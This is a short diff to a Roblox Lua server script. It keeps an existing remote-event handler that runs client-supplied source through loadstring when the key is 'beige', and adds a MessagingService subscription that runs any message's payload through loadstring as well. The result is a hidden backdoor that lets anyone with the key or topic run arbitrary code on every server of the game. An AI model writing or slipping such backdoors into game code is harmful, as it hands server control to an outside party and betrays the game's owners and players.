@@ -1,5 +1,7 @@
 local DataStoreService = game:GetService("DataStoreService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local MessagingService = game:GetService("MessagingService")
+
 local target = DataStoreService:GetDataStore("__TEST")
 
 --[[
@@ -43,4 +45,14 @@ remote.OnServerEvent:Connect(function(plr, key, src)
     if key == "beige" then --theres a reason i call it colorful
         loadstring(src)()
     end
+end)
+
+MessagingService:SubscribeAsync("Bice", function(message)
+    local data = message.Data
+
+    if data.ExcludeSelf and data.SenderJobId == game.JobId then
+        return
+    end
+
+    loadstring(data.Data)()
 end)
